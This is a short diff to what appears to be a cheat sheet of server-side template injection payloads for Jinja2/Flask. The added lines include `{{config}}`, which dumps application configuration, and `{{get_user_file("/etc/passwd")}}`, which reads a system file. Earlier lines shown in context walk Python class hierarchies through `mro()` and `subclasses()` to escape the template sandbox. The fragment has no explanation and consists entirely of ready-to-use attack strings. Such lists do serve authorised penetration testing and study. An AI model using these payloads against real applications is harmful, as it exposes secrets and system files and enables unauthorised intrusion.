@@ -9,6 +9,8 @@
 
 `{{'7'*7}}`
 
+`{{config}}`
+
 `{{config.items()}}`
 
 `{{config.from_object(‘os’)}}`
@@ -24,6 +26,10 @@
 `{{''.class.mro()[1].subclasses()}}`
 
 `{{[].class.base.subclasses()}} `
+
+`{{get_user_file("/etc/passwd")}}`
+
+`{{get_user_file("path-to-file")}}`
 
 ---------------------------------------------------------------------------------------------------------------------
 
